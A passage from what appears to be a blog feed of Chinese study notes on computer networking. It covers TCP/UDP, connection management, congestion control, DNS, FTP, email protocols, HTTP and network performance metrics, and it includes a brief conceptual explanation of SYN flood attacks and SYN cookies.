src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306210558090.png" alt="image-20240306210558090"></p><p>成功！其余的开发配置就和上面的wsl配置没什么区别了，就懒得整了</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-3</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<h1 id="传输层概述"><a href="#传输层概述" class="headerlink" title="传输层概述"></a>传输层概述</h1><p>传输层学习两种协议，TCP和UDP协议</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305182817812.png" alt="image-20240305182817812"></p><p><strong>TCP协议的作用：</strong></p><ul><li>可靠传输</li><li>流量控制</li><li>拥塞控制</li></ul><p>传输层是只有主机才有的层次，传输层可以为应用层提供服务，也可以使用网络层的服务</p><p>传输层的功能：</p><ul><li>传输层提供进程和进程之间的逻辑通信。网络层则提供主机之间的逻辑通信。</li><li>复用和分用。</li><li>传输层对收到的报文进行差错检测</li><li>传输层有两种协议</li></ul><h1 id="传输层的寻址与端口"><a href="#传输层的寻址与端口" class="headerlink" title="传输层的寻址与端口"></a>传输层的寻址与端口</h1><p><strong>复用</strong>：应用层所有的应用进程都可以通过传输层再传输到网络层。</p><p><strong>分用</strong>：传输层从网络层收到数据后交付指明的应用进程。</p><p>端口号标识主机中的应用进程。</p><p>端口号长度为16bit，所以能表示的端口号数量为65535个。</p><p><strong>端口号的分类：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305183319948.png" alt="image-20240305183319948"></p><p>所以有些程序都会有默认端口号，比如HTTP的80端口，HTTPS的443端口，这里列举出一些协议的端口号：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305183457929.png" alt="image-20240305183457929"></p><blockquote><p> 在网络中采用发送方和接收方的套接字组合来识别端点，套接字唯一标识了网络中的一个主机和它上面的一个进程。</p><p>套接字socket&#x3D;(主机IP地址，端口号)</p></blockquote><h1 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h1><p>UDP只在IP数据报服务之上增加了很少功能，即复用分用和差错检测功能。</p><h2 id="UDP的主要特点"><a href="#UDP的主要特点" class="headerlink" title="UDP的主要特点"></a>UDP的主要特点</h2><ol><li><p>UDP是无连接的，减少开销和发送数据之前的时延。</p></li><li><p>UDP使用最大努力交付，即不保证可靠交付。</p></li><li><p>UDP是面向报文的，适合一次性传输少量数据的网络应用。</p></li><li><p>UDP无拥塞控制，适合很多实时应用，比如一些实时视频之类的，丢失了少量数据也是允许的。</p></li><li><p>UDP首部开销小，8B(字节)，TCP20B(字节)</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305215954723.png" alt="image-20240305215954723"></p><h2 id="UDP首部格式"><a href="#UDP首部格式" class="headerlink" title="UDP首部格式"></a>UDP首部格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220132283.png" alt="image-20240305220132283"></p><h2 id="UDP校验过程"><a href="#UDP校验过程" class="headerlink" title="UDP校验过程"></a>UDP校验过程</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220303149.png" alt="image-20240305220303149"></p><p><strong>伪首部校验</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220730662.png" alt="image-20240305220730662"></p><h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><h2 id="TCP协议的特点"><a href="#TCP协议的特点" class="headerlink" title="TCP协议的特点"></a>TCP协议的特点</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305221800753.png" alt="image-20240305221800753"></p><p>发送数据时，先把一定的字节放入缓存中，然后取一些字节组成报文段然后带上TCP头部组成完整报文段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305222029888.png" alt="image-20240305222029888"></p><blockquote><p>字节数不是固定的</p></blockquote><h2 id="TCP报文段首部格式"><a href="#TCP报文段首部格式" class="headerlink" title="TCP报文段首部格式"></a>TCP报文段首部格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305222924879.png" alt="image-20240305222924879"></p><p><strong>下面是各个部分的作用：</strong></p><ul><li><p>序号:在一个TCP连接中传送的字节流中的每一个字节都按顺序编号，本字段表示本报文段所发送数据的第一个字节的序号。</p></li><li><p>确认号:期望收到对方下一个报文段的第一个数据字节的序号。若确认号为N,则证明到序号N-1为止的所有数据都已正确收到。</p></li><li><p>数据偏移(首部长度):TCP报文段的数据起始处距离TCP报文段的起始处有多远以4B位单位，即1个数值是4B。</p></li><li><p>窗口:指的是发送本报文段的一方的接收窗口，即现在允许对方发送的数据量。</p></li><li><p>检验和:检验首部+数据，检验时要加上12B伪首部，第四个字段为6。</p></li><li><p>紧急指针:URG&#x3D;1时才有意义，指出本报文段中紧急数据的字节数</p></li><li><p>选项:最大报文段长度MSS、窗口扩大、时间戳、选择确认…</p></li><li><p>填充:即将报文首部填充至4B的整数倍</p></li></ul><p><strong>6个控制位</strong></p><ul><li><p>紧急位URG：URG&#x3D;1时，标明此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用在缓存里排队，配合紧急指针字段使用。</p></li><li><p>确认位ACK：ACK&#x3D;1时确认号有效，在连接建立后所有传送的报文段都必须把ACK置为1。</p></li><li><p>推送位PSH：PSH&#x3D;1时，接收方尽快交付接收应用进程，不再等到缓存填满再向上交付。</p></li><li><p>复位RST：RST&#x3D;1时，表明TCP连接中出现严重差错，必须释放连接，然后再重新建立传输链接。</p></li><li><p>同步位SYN：SYN&#x3D;1时，表明是一个连接请求&#x2F;连接接受报文。</p></li><li><p>终止位FIN：FIN&#x3D;1时，表明此报文段发送方数据已发完，要求释放连接。</p></li></ul><h1 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h1><p>TCP连接传输的三个阶段：</p><p>连接建立&#x3D;》数据传输&#x3D;》连接释放</p><h2 id="TCP连接建立"><a href="#TCP连接建立" class="headerlink" title="TCP连接建立"></a>TCP连接建立</h2><p>采用三次握手建立TCP连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305225606569.png" alt="image-20240305225606569"></p><blockquote><p>seq是序号，ack是确认号</p></blockquote><h2 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h2><p>SYN洪泛攻击发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供服务了。</p><p><strong>防范SYN洪泛攻击的方法</strong></p><p>可以通过设置SYN cookie</p><h2 id="TCP的连接释放"><a href="#TCP的连接释放" class="headerlink" title="TCP的连接释放"></a>TCP的连接释放</h2><p>采用四次握手</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305230921528.png" alt="image-20240305230921528"></p><blockquote><p>等待2MSL的目的是为了能够彻底关闭连接</p><p>因为若B没有收到确认报文段会在2MSL内重新发送第三个报文段，若A直接关闭了就会收不到重传的报文段，B就会一直重传导致连接无法完全关闭</p></blockquote><h1 id="TCP可靠传输"><a href="#TCP可靠传输" class="headerlink" title="TCP可靠传输"></a>TCP可靠传输</h1><p>可靠传输就是保证接收方进程从缓存区读出的字节流与发送方发出的字节流是完全一样的。</p><p>实现可靠传输的机制：</p><ol><li><p><strong>校验</strong></p><p>增加伪首部与UDP校验一样，</p></li><li><p><strong>序号</strong></p><p>一个字节占一个序号；序号字段指的是一个报文的第一个字节的序号</p><p>一个报文段的字节数取决于MTU(链路层的最大传输单元)</p></li><li><p><strong>确认</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306003306167.png" alt="image-20240306003306167"></p><p>这里发送方要在收到确认报文段之后才会将报文段从缓存中删去，因为可能需要重传。</p><p>如果456和78一起发送过去，只收到了78，接受方就会返回ack为4的报文段，发送方就会重传456报文段，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306003639763.png" alt="image-20240306003639763"></p></li><li><p><strong>重传</strong></p><p>TCP的发送方在规定时间内没有收到确认报文段就要重传已发送的报文段；也就是超时重传</p><p>重传时间的设置就采用了自适应算法，动态改变重传时间RTTs(加权平均往返时间)</p><p>不过等待时间过久，还有一种冗余ACK(冗余确认)方法来提高效率</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306004112025.png" alt="image-20240306004112025"></p></li></ol><h1 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h1><p>流量控制：也就是控制发送速率，使接收方能够完全接收数据</p><p>TCP采用滑动窗口机制实现流量控制</p><p>在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，即接收窗口rwnd(接收方设置确认报文段的窗口字段来将rwnd通知给发送方)，发送方的发送窗口取接收窗口rwnd和拥塞窗口cwnd的最小值。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306132247748.png" alt="image-20240306132247748"></p><h1 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h1><p>出现拥塞的条件：对资源需求总和&gt;可用资源</p><p>拥塞控制就是防止过多的数据注入到网络中。(全局性控制)</p><p>拥塞控制还有四种算法：满开始、拥塞避免、快重传、快恢复</p><p><strong>现在先假定一下情况来学习这四种算法：</strong></p><ol><li><p>数据单方向传送，而另一个方向只传送确认(就是没有捎带确认，也就是附加数据)</p></li><li><p>接收方总是有足够大的缓存空间，因而发送窗口大小取决于拥塞程度</p><p>发送窗口&#x3D;Min{接收窗口rwnd，拥塞窗口cwnd}</p><p>接收窗口：接收方根据接受缓存设置的值，并告知给发送方，反映接收方容量。<br>拥塞窗口：发送方根据自己估算的网络拥塞程度而设置的窗口值，反映网络当前容量。</p></li></ol><h2 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306134517263.png" alt="image-20240306134517263"></p><p>慢开始就是逐渐增加注入的报文段，在达到sshresh(慢开始门限)之前以2的指数倍上升，第一次传输1，第二次则2，第三次则4，以此类推，这里在收到确认报文段之后就会立刻改变拥塞窗口大小；到达门限之后就线性增长，这里的图就逐次加一。</p><p>检测到网络拥塞之后，cwnd(拥塞窗口)就直接降到一，然后重复前面的过程，但是唯一改变的就是sshresh，是在检测到网络拥塞时，将拥塞窗口除以2作为新的sshresh</p><h2 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306134721633.png" alt="image-20240306134721633"></p><p>快重传就是上面说到的冗余ACK，收到三个重复的确认之后就会执行快重传。</p><p>快重传之后执行的就是快恢复，快恢复不会立刻降到拥塞窗口为1，而是降到新的门限值，门限值的大小就是检测到三个重复确认时的拥塞窗口除以2.</p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-2</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>应用层对应用程序的通信提供服务。</p><p><strong>应用层协议定义:</strong></p><ul><li><p>应用进程交换的报文类型，请求还是响应?</p></li><li><p>各种报文类型的语法，如报文中的各个字段及其详细描述字段的语义，即包含在字段中的信息的含义。</p></li><li><p>进程何时、如何发送报文，以及对报文进行响应的规则。</p></li></ul><p><strong>应用层的功能：</strong></p><ul><li><p>文件传输、访问和管理    </p></li><li><p>电子邮件      </p></li><li><p>虚拟终端     </p></li><li><p>查询服务和远程作业登录</p></li></ul><p><strong>应用层重要协议</strong></p><p> <strong>FTP</strong>，<strong>SMTP、POP3</strong>， <strong>HTTP</strong>， <strong>DNS</strong></p><p><strong>网络应用模型</strong></p><ul><li>客户&#x2F;服务器模型（C&#x2F;S）</li><li>P2P模型（Peer-to-peer）也叫对等模型</li></ul><h1 id="DNS系统"><a href="#DNS系统" class="headerlink" title="DNS系统"></a>DNS系统</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>域名从左到右级别逐渐升高，最右边的叫做顶级域名</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091606492.png" alt="image-20240305091606492"></p><p><strong>根</strong></p><p>根指的是顶级域名右边的一点，所以完整的域名写法应该是<a href="http://www.xxx.com.,从根后面才是顶级域名/">www.xxx.com.，从根后面才是顶级域名</a></p><p><strong>顶级域名</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091738436.png" alt="image-20240305091738436"></p><p>反向域名即通过IP地址来反向解析出域名</p><p><strong>二级域名</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091920777.png" alt="image-20240305091920777"></p><p><strong>域名树</strong></p><p>域名可以有很多级，比如学校的域名就有三级、四级等等</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305092053637.png" alt="image-20240305092053637"></p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><ul><li><p>本地域名服务器：当一个主机发出DNS查询请求时，这个查询请求报文就发给本地域名服务器。</p></li><li><p>根域名服务器：知道所有的域名，就是知道顶级域名对应那个顶级域名服务器，在本地域名服务器找不到域名时就会先去请求根域名服务器</p></li><li><p>顶级域名服务器：管理该顶级域名服务器注册的所有二级域名</p></li><li><p>权限域名服务器：负责一个区的域名服务器</p></li></ul><p>总之就是向DNS请求来指明下一步要查询哪一个DNS服务器，这是一个示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093038757.png" alt="image-20240305093038757"></p><h2 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h2><p>可以参考这篇文章：<a href="https://blog.csdn.net/m0_37263637/article/details/85157611">域名分级与域名解析过程(DNS)-CSDN博客</a></p><p>域名解析分为两种查询：</p><ul><li><p>递归查询</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093323157.png" alt="image-20240305093323157"></p></li><li><p>迭代查询</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093347626.png" alt="image-20240305093347626"></p></li></ul><p>这两种查询的区别就是客户角色不同，递归是每一种服务器都要做查询用户，而迭代就一直是本地域名服务器做查询用户</p><h2 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h2><p>这是为了提高DNS查询效率的方法，比如最近查询过的域名会存放在本地域名服务器</p><h1 id="文件传送协议"><a href="#文件传送协议" class="headerlink" title="文件传送协议"></a>文件传送协议</h1><ul><li>文件传送协议FTP(FileTransfer Protocol)：提供不同种类主机系统(硬、软件体系等都可以不同)之间的文件传输能力。</li><li>简单文件传送协议TFTP(Trivial File Transfer Protocol)</li></ul><h2 id="FTP服务端和用户端"><a href="#FTP服务端和用户端" class="headerlink" title="FTP服务端和用户端"></a>FTP服务端和用户端</h2><blockquote><p> FTP是基于客户&#x2F;服务器(C&#x2F;S)的协议。</p><p>用户通过一个客户机程序连接至在远程计算机上运行的服务器程序。</p><p>依照 FTP协议提供服务，进行文件传送的计算机就是FTP服务器。</p><p>连接FTP服务器，遵循FTP协议与服务器传送文件的电脑就是FTP客户端</p></blockquote><h2 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a>FTP工作原理</h2><ul><li><p>登陆</p><p>知道ftp服务器地址后有两种登陆方式，一种是用户名&amp;密码登陆方式，另一种是匿名登陆</p><blockquote><p>互连网中有很大一部分FTP 服务器被称为“匿名”(Anonymous)FTP服务器。这类服务器的目的是向公众提供文件拷贝服务，不要求用户事先在该服务器进行登记注册，也不用取得FTP服务器的授权。Anonymous(匿名文件传输)能够使用户与远程主机建立连接并以匿名身份从远程主机上拷贝文件，而不必是该远程主机的注册用户。用户使用特殊的用户名“anonymous”登陆FTP服务，就可访问远程主机上公开的文件。这样可以减少服务器的压力。</p></blockquote></li></ul><p>FTP使用TCP实现可靠传输</p><p>FTP的服务器进程分为两种：</p><ul><li>一个主进程：负责接收请求</li><li>n个从属进程：去处理用户请求</li></ul><p>这是ftp传输的过程及其使用的端口号：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305095147480.png" alt="image-20240305095147480"></p><p>ftp传输的文件有两种模式：</p><ul><li>文本模式：ASCII模式，以文本序列传输数据</li><li>二进制模式：Binary模式，以二进制序列传输数据</li></ul><h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><h2 id="信息格式"><a href="#信息格式" class="headerlink" title="信息格式"></a>信息格式</h2><ul><li><p>信封：例如<a href="mailto:&#120;&#120;&#x78;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#120;&#120;&#x78;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a></p></li><li><p>内容</p><ul><li><p>首部</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305124931354.png" alt="image-20240305124931354"></p></li><li><p>主体</p><p>就是邮件内容了。</p></li></ul></li></ul><h2 id="组成结构"><a href="#组成结构" class="headerlink" title="组成结构"></a>组成结构</h2><p>邮件发送采用C&#x2F;S模式，邮件服务器既可以做服务器也可以做发送方客户端，下面是一个示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305130100685.png" alt="image-20240305130100685"></p><p>邮件是存放在邮件服务器的缓存当中</p><h2 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h2><p>SMTP规定了14条命令(几个字母)和21种应信息(三位数字代码+简单文字说明)。</p><p>用于TCP连接的端口号一般是25端口</p><p><strong>SMTP通信的三个阶段</strong></p><p>连接建立&#x3D;》邮件传送&#x3D;》连接释放</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305131325496.png" alt="image-20240305131325496"></p><p><strong>SMTP的缺点</strong></p><ol><li><p>SMTP不能传送可执行文件或者其他二进制对象。</p></li><li><p>SMTP仅限于传送7位ASCII码，不能传送其他非英语国家的文字。</p></li><li><p>SMTP服务器会拒绝超过一定长度的邮件。</p></li></ol><p><strong>MIME</strong></p><p>也叫通用因特网邮件扩充MIME，用来弥补SMTP协议的不足，MIME是电子邮件可以传输各种各样的数据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305131619206.png" alt="image-20240305131619206"></p><p>现在也不光为邮件服务使用，也已经为浏览器使用，传输数据的时候就会声明传输的数据是什么MIME类型，http的请求头会有一栏<strong>content-type</strong>就是标识数据的MIME类型</p><h2 id="邮局协议POP3"><a href="#邮局协议POP3" class="headerlink" title="邮局协议POP3"></a>邮局协议POP3</h2><p>该协议也采用TCP连接，端口号一般为110，也是C&#x2F;S模式，作用在最后用户读取邮件内容的时候</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305132443641.png" alt="image-20240305132443641"></p><p>其工作方式有两种：</p><ul><li>下载并保留(在服务器)</li><li>下载并删除</li></ul><h2 id="网际报文存取协议IMAP"><a href="#网际报文存取协议IMAP" class="headerlink" title="网际报文存取协议IMAP"></a>网际报文存取协议IMAP</h2><p>IMAP协议比POP协议复杂。当用户Pc上的IMAP客户程序打开IMAP服务器的邮箱时，用户可以看到邮箱的首部，若用户需要打开某个邮件，该邮件才上传到用户的计算机上。</p><p>IMAP可以让用户在不同的地方使用不同的计算机随时上网阅读处理邮件，还允许只读取邮件中的某一个部分<br>(先看正文，有WiFi的时候再下载附件)。</p><p>该协议也是和POP3一样作用在最后一个环节</p><h2 id="基于万维网的电子邮件"><a href="#基于万维网的电子邮件" class="headerlink" title="基于万维网的电子邮件"></a>基于万维网的电子邮件</h2><p>现在很少专门去下载发送邮件的软件，我们直接在网上输入邮箱写上内容就可以发送邮件了，是基于http协议去连接别的厂商的邮件服务器，比如通过http协议用户代理连接到网易邮件服务器</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305132800061.png" alt="image-20240305132800061"></p><h1 id="万维网和HTTP协议"><a href="#万维网和HTTP协议" class="headerlink" title="万维网和HTTP协议"></a>万维网和HTTP协议</h1><h2 id="URL和URI"><a href="#URL和URI" class="headerlink" title="URL和URI"></a>URL和URI</h2><p><strong>URI</strong>叫做统一资源标识符，<strong>URL</strong>（统一资源定位符）是其中的一种。</p><p>HTTP 请求的内容通称为”资源”。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 <strong>URI</strong> 来进行标识。</p><p>一般情况下，资源的名称和位置由同一个 URL（统一资源定位符，它是 URI 的一种）来标识。也有某些特殊情况，资源的名称和位置由不同的 URI 进行标识：例如，待请求的资源希望客户端从另外一个位置访问它。我们可以使用一个特定的首部字段，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc"><code>Alt-Svc</code></a>，来指示这种情况。</p><p><strong>URL</strong> 由多个必须或可选的组件构成。下面给出了一个复杂的 URL：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument<br></code></pre></td></tr></table></figure><p><strong>URL的结构如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">URI=scheme:[//authority]path[?query][#fragment]<br>authority组件又分为三部分：[userinfo@]host[:port]<br>该组件中，userinfo用的比较少，一般HTTP以匿名的方式获取数据，如果要进行身份验证，格式为 username:password ,以@结尾<br></code></pre></td></tr></table></figure><p><strong>URN</strong> 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">urn:isbn:9780141036144<br>urn:ietf:rfc:7230<br></code></pre></td></tr></table></figure><h2 id="HTTP请求过程"><a href="#HTTP请求过程" class="headerlink" title="HTTP请求过程"></a>HTTP请求过程</h2><p>HTTP请求具体过程示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305133740408.png" alt="image-20240305133740408"></p><h2 id="HTTP连接方式"><a href="#HTTP连接方式" class="headerlink" title="HTTP连接方式"></a>HTTP连接方式</h2><p>http协议本身是一个无状态协议，如果需要识别用户的话可以利用Cookie</p><p>连接方式：</p><ul><li><p>持久连接(Keep-alive)</p><p>只需要进行一次TCP连接，后续再发送新数据不需要重新建立连接</p><ul><li><p>非流水线</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134328129.png" alt="image-20240305134328129"></p><p>这就是非流水线式的连接，要在收到响应后才能继续下一次请求</p></li><li><p>流水线</p><p>就是可以同时发送多个请求报文不需要逐次等待</p></li></ul></li><li><p>非持久连接(Close)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134223174.png" alt="image-20240305134223174"></p><p>即每次发送一次新的数据都需要重新建立连接，比较耗时</p></li></ul><h2 id="HTTP请求报文结构"><a href="#HTTP请求报文结构" class="headerlink" title="HTTP请求报文结构"></a>HTTP请求报文结构</h2><p>这里放一张图就行了，这是get请求的报文结构</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134824112.png" alt="image-20240305134824112"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习(1)</title>
      <link href="/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p><strong>这里根据王道考研视频来学习，啃书太折磨了()</strong></p><h1 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h1><h2 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305004320101.png" alt="image-20240305004320101"></p><h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>计算机网络中，带宽用来表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。单位是“比特每秒”，b&#x2F;s，kb&#x2F;s，Mb&#x2F;s，Gb&#x2F;s。网络设备所支持的最高速度。</p><p>也就是理论上的最高速率。</p><p>带宽增大也就是发送的速率变快了，并不影响传播的速率。</p><h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>表示在单位时间内通过某个网络(或信道、接口)的数据量。单位b&#x2F;s，kb&#x2F;s，Mb&#x2F;s等。</p><p>吞吐量受网络的带宽或网络的额定速率的限制。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>指数据(报文&#x2F;分组&#x2F;比特流)从网络(或链路)的一端传送到另一端所需的时间。也叫延迟或迟延。单位是s。</p><p>时延又分为4种：</p><ul><li>发送时延(传输时延)：发送时延&#x3D;数据长度&#x2F;信道带宽(发送速率)</li><li>传播时延：取决于电磁波传播速度和链路长度，传播时延&#x3D;信道长度&#x2F;电磁波在信道上的传播速率</li><li>排队时延：等待输出、输入链路可用(例如排队等安检)</li><li>处理时延：检错找出口(例如安检时的过程要的时间)</li></ul><h2 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h2><p>时延带宽积(bit)&#x3D;传播时延(s) X 带宽(b&#x2F;s)</p><p>时延带宽积又称为以比特为单位的链路长度</p><p>就是链路上的容量</p><h2 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h2><p>从发送方发送数据开始，到发送方收到接收方的确认(接收方收到数据后立即发送确认)，总共经历的时延。</p><p>这里可以用ping来看到往返时延</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305084247521.png" alt="image-20240305084247521"></p><p>上面的时间就是往返时延</p><p>RTT越大，在收到确认之前，可以发送的数据越多，因为收到确认前的时间越长</p><p>RTT包括以下两部分：</p><ul><li>往返传播时延&#x3D;传播时延*2（主要就是这个）</li><li>末端处理时间</li></ul><h2 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h2><ul><li>信道利用率：信道利用率&#x3D;有数据通过时间&#x2F;(有+无)数据通过时间</li><li>网络利用率：信道利用率的加权平均值</li></ul><p><strong>时延和利用率的关系图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305084703782.png" alt="image-20240305084703782"></p><p>这就相当于高速车辆越多行驶越缓慢</p><h1 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h1><p>OSI七层模型偏理论，并不在实际中运用，因为该模型十分理想，且效率低但对我们了解网络模型有帮助</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304110839603.png" alt="image-20240304110839603"></p><p>下面是一个利用OSI七层模型通过中间系统进行信息传输的示例图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304111508504.png" alt="image-20240304111508504"></p><p>除了物理层，每一层都会对数据进行封装再往下一层传输，信息处理的过程示例图如下，也就是打包和拆包的过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304111743194.png" alt="image-20240304111743194"></p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>能和用户交互产生网路流量的程序</p><p>典型应用层服务：</p><p>文件传输(FTP)</p><p>电子邮件(SMTP)</p><p>万维网(HTTP)</p><p>……</p><h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><p>用户处理两个通信系统中交换信息的表示方式</p><p>功能一：数据格式变换</p><p>功能二：数据加密解密</p><p>功能三：数据压缩和恢复</p><h2 id="会话层"><a href="#会话层" class="headerlink" 